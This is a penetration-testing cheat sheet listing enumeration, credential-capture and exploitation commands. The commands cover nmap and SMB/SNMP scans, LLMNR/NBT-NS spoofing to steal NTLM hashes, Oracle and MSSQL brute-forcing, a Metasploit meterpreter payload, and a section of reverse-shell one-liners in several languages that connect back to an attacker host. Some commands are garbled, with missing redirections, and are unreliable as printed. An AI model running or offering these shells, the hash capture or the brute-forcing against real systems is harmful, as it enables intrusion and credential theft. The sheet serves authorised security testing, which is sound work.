[Back to Main Page](../index.html) 

# Introduction

This penetration cheat sheet should be used as a quick reference overview for various and typical commands used when performing penetration tests.

**Table of Contents** 

- [Pre-engagement](#pre-engagement)
    - [Network Configuration](#network-configuration)
        - [Set IP Address](#set-ip-address)
        - [Subnetting](#subnetting)
- [Information Gathering](#information-gathering)
    - [DNS Enumeration](#dns-enumeration)
    - [Active Information Gathering](#active-information-gathering)
        - [DNS Bruteforce](#dns-bruteforce)
        - [Port Scanning](#port-scanning)
    - [Enumeration of Network Services](#enumeration-of-network-services)
        - [SMB SAMB Enumeration](#smb-samb-enumeration)
        - [LLMNR and NBT-NS Attack Spoofing](#llmnr-and-nbt-ns-attack-spoofing)
        - [SNMP Enumeration](#snmp-enumeration)
    - [TLS and SSL Testing](#tls-and-ssl-testing)        
- [Penetration Tests](#penetration-tests)
    - [Database Penetration](#database-penetration)
        - [Oracle](#oracle)
        - [MSSQL](#mssql)    
- [Network](#network)
- [Reverse Shells](#reverse-shells)
    - [Setting up a Reverse Shell](#setting-up-a-reverse-shell)
        - [Listener on local machine](#listener-on-local-machine)
        - [Netcat Reverse Shell](#netcat-reverse-shell)
        - [Bash Reverse Shell](#bash-reverse-shell)
        - [PHP Reverse Shell](#php-reverse-shell)
        - [Telnet Reverse Shell](#telnet-reverse-shell)
        - [Perl Reverse Shell](#perl-reverse-shell)
        - [Ruby Reverse Shell](#ruby-reverse-shell)
        - [Java Reverse Shell](#java-reverse-shell)
        - [Python Reverse Shell](#python-reverse-shell)
    - [Kali Reverse Shell](#kali-reverse-shell)        
                
        


# Pre-engagement

## Network Configuration

### Set IP Address

`ifconfig eth0 xxx.xxx.xxx.xxx/24 `

### Subnetting

`ipcalc xxx.xxx.xxx.xxx/24`

`ipcalc xxx.xxx.xxx.xxx 255.255.255.0`

# Information Gathering

## DNS Enumeration 

`whois domain.com`   
Domain name lookup service to search the whois database for domain name registration information.

`dig a domain.com @nameserver`    
Dig dns lookup / nameserver query.

`dig mx domain.com @nameserver`   
Perform MX record Lookup.

`dig axfr domain-name-here.com @nameserver`   
Perform Zone Transfer.

##  Active Information Gathering

### DNS Bruteforce

`dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`   
DNS Recon via Kali Tools.

### Port Scanning

`nmap -v -sS -A -T4 target`   
Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services.

`nmap -v -sS -p--A -T4 target`   
As above but scans all TCP ports (takes a lot longer).

`nmap -v -sU -sS -p- -A -T4 target`   
As above but scans all TCP ports and UDP scan (takes even longer).

`netdiscover -r 192.168.1.0/24`   
Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site.

## Enumeration of Network Services

### SMB SAMB Enumeration

`nbtscan 192.168.1.0/24`   
nbtscan is a external tool that discovers Windows / Samba servers on subnet, finds Windows MAC address, exposed netbios nameservers and discovers client workgroup or domain.

`enum4linux -a target-ip`    
enum4linux is a tool for enumerating information from Windows and Samba systems.

`smbclient -L //192.168.1.100`   
Use it to find the smbclient version.

`nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254`   
`python /usr/share/doc/python-impacket-doc/examples /samrdump.py 192.168.XXX.XXX`   
Enumerate SMB Users

`nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24`   
Find open SMB shares

`use auxiliary/scanner/smb/smb_lookupsid`   
METASPLOIT MODULE - Determine what users exist via brute force SID lookups. This module can enumerate both local and domain accounts by setting ACTION to either LOCAL or DOMAIN.

`smbclient -L //192.168.99.131`   
Test for Null Session on Windows Server 2000.

### LLMNR and NBT-NS Attack Spoofing

Steal credentials off the network. LLMNR and NetBIOS are two name resolution services built in to Windows to help systems find address names from other devices on the network. 

`auxiliary/spoof/llmnr/llmnr_response`   
`auxiliary/spoof/nbns/nbns_response`   
Spoof / poison LLMNR / NetBIOS requests.

`auxiliary/server/capture/smb`   
`auxiliary/server/capture/http_ntlm`   
Capture the hashes of LLMNR / NBT-NS. You’ll end up with NTLMv2 hash, use john or hashcat to crack it.

### SNMP Enumeration

SNMP enumeration is the process of using SNMP to enumerate user accounts on a target system. SNMP employs two major types of software components for communication: the SNMP agent, which is located on the networking device, and the SNMP management station, which communicates with the agent.

`snmp-check -t 192.168.1.2 -c public`   
`snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName|cut -d* * -f`   
`snmpenum -t 192.168.1.X`   
`onesixtyone -c names -i hosts`   
Different SNMP Enumerations.

`nmap -sV -p 161 --script=snmp-info TARGET-SUBNET`   
SNMPv3 Enumeration.

`/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`
Metasploit's wordlist has common credentials for SNMPv1 and SNMPv2.

## TLS and SSL Testing

`./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html`
Test all options on a single host and output to a .html file.

# Penetration Tests

## Database Penetration

### Oracle

`apt-get install oscanner`    
`oscanner -s 192.168.1.200 -P 1521`   
Install and Run OScanner for SID Enumeration, Password tests, Version, Accounts, Audits, policies.

`nmap --script=oracle-tns-version`   
Fingerprint / get Oracle TNS version.

`nmap -p 1521 -A TARGET`   
Run nmap against oracle TNS.

`nmap --script=oracle-sid-brute`   
`nmap --script=oracle-brute`   
Identify default Oracle users. Login to continue the oracle privilege escalation.

### MSSQL

`nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156`   
`msf > use auxiliary/scanner/mssql/mssql_ping`   
Use nmap or METASPLOIT for MSSQL Enumeration.

`msf > use auxiliary/admin/mssql/mssql_enum`
Bruteforce MSSQL Login.

`msf > use exploit/windows/mssql/mssql_payload`   
`msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp` 
Metasploit MSSQL Shell.

# Network


# Reverse Shells

## Setting up a Reverse Shell

### Listener on local machine

`nc -nvlp 80`   
Listens on port number, use a port number which is likely to be allowed (e.g. 80 / 443 / 2492+).

### Netcat Reverse Shell

`nc -e /bin/sh ATTACKING-IP 80`   
`/bin/sh | nc ATTACKING-IP 80`   
`rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p`   
Often nc -e is blocked, due this try one of the other methods below.

### Bash Reverse Shell

`exec /bin/bash 0&0 2>&0`   
`0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196`   
`bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1`   
Normal bash reverse shells.

### PHP Reverse Shell

`php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`   
Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6.

### Telnet Reverse Shell

`rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p`   
`telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443`   
Also listen on Port 443, due telnet.

### Perl Reverse Shell

`perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`    
Linux.

`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`   
`perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`   
Windows.

### Ruby Reverse Shell

`ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

### Java Reverse Shell

`r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()`

### Python Reverse Shell

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


## Kali Reverse Shell

